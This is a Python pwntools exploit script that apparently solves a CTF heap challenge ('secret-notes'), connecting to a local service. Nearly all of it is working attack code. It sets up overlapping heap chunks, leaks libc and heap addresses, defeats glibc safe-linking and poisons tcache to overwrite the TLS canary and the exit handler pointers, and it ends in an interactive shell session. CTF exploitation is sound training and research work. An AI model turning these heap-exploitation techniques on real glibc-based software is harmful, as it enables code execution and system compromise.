#!/usr/bin/env python3

from pwn import *

exe = ELF("./src/chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = 'konsole -e'.split()


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 12387)
        # r = remote("secret-notes.chal.hitconctf.com", 12387)

    return r


r = conn()

def login(name, password):
    r.sendlineafter(b'Input your action:', b'1')
    r.sendlineafter(b'Input the username:', name)
    r.sendlineafter(b'Input the 8 bytes password:', password)

def _create_note(length, note):
    r.sendlineafter(b'Input your action:', b'1')
    r.sendlineafter(b'Input the length of the note, including headers:', str(length).encode())
    r.sendafter(b'Input the note:', note)
    r.recvuntil(b'Successfully add the note as id ')
    note_id = int(r.recvuntil(b'.')[:-1])
    return note_id
    
def create_note(note):
    return _create_note(len(note), note)

def read_note(idx):
    r.sendlineafter(b'Input your action:', b'2')
    r.sendlineafter(b'Input the note id:', str(idx).encode())
    r.recvuntil(b'Here is your note "')
    note_header = r.recvuntil(b'": ')[:-3]
    note_value = r.recvline().strip()
    return note_header, note_value

def delete_note(idx):
    r.sendlineafter(b'Input your action:', b'3')
    r.sendlineafter(b'Input the note id:', str(idx).encode())
    
def logout():
    r.sendlineafter(b'Input your action:', b'4')


free = delete_note

safe_link = lambda addr, ptr: (addr >> 12) ^ ptr


login(b'asdf', b'\x00'*8)

info("huge chunk 1, use some memory (mmaped)")
payload = b'ASDF:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += b'D' * (0x1FFFFF2-0x20)
payload += b'\n'
big1 = create_note(payload)


payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += (0x28-1-1 - len(payload)) * b'A' + b'\n'
note1 = create_note(payload)


target_size = 0xa51
target_size = p16(target_size)
t0, t1 = target_size
k0 = t0 ^ 0x44 ^ 0x31
k1 = t1 ^ 0x45

payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
# body will be xored with \x01
# payload += (0x800-1-1 - len(payload)) * b'A' + b'\n'
payload += b'XXXX' + p64(u64(b':A:' + p8(k0) + p8(k1) + b':DE') ^ 0x0101010101010101)
payload += (0x800-1-1 - len(payload)) * b'A' + b'\n'
filler1 = create_note(payload)

free(filler1)

payload = b'R:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += b'aaa\n'
strtoker = create_note(payload)

free(strtoker)
free(note1)

payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += (0xa20-1-1 - len(payload)) * b'V' + b'\n'
victim = create_note(payload)

log.info(f'victim id = {victim}')

payload = b'AAAAAAA:\x01\x01\x01\x01\x01\x01\x01\x01\n'
# payload = payload.ljust(0x20, b'A')
fake_chunk = 7*b'A' + p64(0xf1^0x0101010101010101)
payload += fake_chunk
payload = payload.ljust(0x100-1-1, b'A') + b'\n'
victim2 = create_note(payload)
log.info(f'victim2 id = {victim2}')

payload = b'R:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += b'aaa\n'
strtoker = create_note(payload)
free(strtoker)


# huge chunk 2, malloc will return null
payload = b'ASDF:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += b'D' * (0x1FFFFF2-0x20)
payload += b'\n'
# pause()
big2 = create_note(payload)

info("Chunk victim header changed")


free(victim)

payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload = payload.ljust(0xa20, b'A') + b'\n'
# payload = payload.ljust(0xa40 - )
# payload += (0xa40-1-1 - len(payload) ) * b'V' + b'\n'
overlapping_victim = create_note(payload)
log.info(f'overlapping_victim id = {overlapping_victim}')


logout()
login(b'asdf', b'\x00'*5 + b'\x7e' + b'\x00'*2)

# leak libc
r.sendlineafter(b'Input your action:', b'2')
r.sendlineafter(b'Input the note id:', str(victim2).encode())
r.recvuntil(b'Here is your note "')
libc_leak = u64(r.recv(6).ljust(8, b'\x00'))
log.info(f'leak = {hex(libc_leak)}')

libc.address = libc_leak - 0x209b20
log.info(f'libc.address = {hex(libc.address)}')


payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += (0xa20-1-1 - len(payload)) * b'V' + b'\n'
unsorted2 = create_note(payload)
log.info(f'unsorted2 id = {unsorted2}')

payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += (0xa20-1-1 - len(payload)) * b'V' + b'\n'
unsorted3 = create_note(payload)
log.info(f'unsorted3 id = {unsorted3}')


free(unsorted2)

payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += (0xa20-1-1 - len(payload)-0x20) * b'V' + b'\n'
unsorted4 = create_note(payload)
log.info(f'unsorted4 id = {unsorted4}')


payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += (0xa20-1-1 - len(payload)) * b'V' + b'\n'
unsorted5 = create_note(payload)
log.info(f'unsorted5 id = {unsorted5}')


logout()
login(b'asdf', b'\x00'*5 + b'\x57' + b'\x00'*2)

# pause()

# leak heap
r.sendlineafter(b'Input your action:', b'2')
r.sendlineafter(b'Input the note id:', str(victim2).encode())
r.recvuntil(b'Here is your note "')
r.recvuntil(b'": ')
heap_leak = u64(r.recv(6).ljust(8, b'\x00')) ^ 0x570000000000
log.info(f'heap_leak = {hex(heap_leak)}')
heap_base = heap_leak - 0x1960
log.info(f'heap_base = {hex(heap_base)}')
# libc_leak = u64(r.recv(6).ljust(8, b'\x00'))
# log.info(f'leak = {hex(libc_leak)}')

# libc.address = libc_leak - 0x209b20
# log.info(f'libc.address = {hex(libc.address)}')

tls_canary_addr = libc.address - 0x2890
log.info(f'tls canary addr = {hex(tls_canary_addr)}')

logout()
login(b'asdf', b'\x00'*8)

free(overlapping_victim)

heap_chunk_ptr = heap_base - 0xe20

payload = b'AAAAAA:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload = payload.ljust(0xa30-8, b'A')
payload += p64(0x2e1 ^ 0x0101010101010101) + 6*b'A' + b'\n'
# payload += p64(0x51 ^ 0x0101010101010101) + p64(safe_link(heap_base, heap_chunk_ptr))[:-2] + b'\n'

# pause()
new_overlapping_victim = create_note(payload)
log.info(f'new_overlapping_victim id = {new_overlapping_victim}')

payload = b'AAAAAA:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload = payload.ljust(0x2e0-1-1-8, b'A') + b'\n'
note_2e0 = create_note(payload)


free(note_2e0)

new_passwd = p64(0x5626fdb60001 ^ 0x0101010101010101)
logout()
login(b'asdf', new_passwd)

free(victim2)

logout()
login(b'asdf', b'\x01'*8)

# pause()
free(new_overlapping_victim)

# pause()
target = p64(safe_link(heap_chunk_ptr, heap_base) ^ 0x0101010101010100)
payload = b'AAAAAA:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload = payload.ljust(0xa30-8, b'A')
payload += p64(0x2f1 ^ 0x010101010101010b) + target + b'\n'
# payload += p64(0x51 ^ 0x0101010101010101) + p64(safe_link(heap_base, heap_chunk_ptr))[:-2] + b'\n'
new_overlapping_victim1 = create_note(payload)

payload = b'AAAAAA:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload = payload.ljust(0x2e0-1-1-8, b'A') + b'\n'
note_dummy = create_note(payload)

bin20_addr = heap_base + 0xb8
exit_handler_addr = libc.address + 0x20aff0-0x10
log.info(f'exit_handler_addr = {hex(exit_handler_addr)}')

payload = b'AAAAAA:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += b'A'*2*8
payload += p64(0x0007000200070002 ^ 0x0101010101010101)
payload += p64(0x0007000700070007 ^ 0x0101010101010101)*15
# payload += b'\x01\x01\x01\x01\x01\x01\x01\x01'*1
payload += p64(tls_canary_addr ^ 0x0101010101010101)*2
payload += b'\x01\x01\x01\x01\x01\x01\x01\x01'
payload += p64(exit_handler_addr ^ 0x0101010101010101)*5
payload = payload.ljust(0x2e0-1-1-8, b'A') + b'\n'
note_tcache = create_note(payload)

log.info(f'tls_canary_addr = {hex(tls_canary_addr)}')
payload = b'\x01\x01\x01\x01\x01\x01\x01\x01:\x01\x01\x01\x01\x01\x01\x01\x01:A\n'
note_tls = create_note(payload)

pause()
payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01:A'
payload = payload.ljust(0x48-1-1, b'A') + b'\n'
note_exit_handler = create_note(payload)
pause()

r.interactive()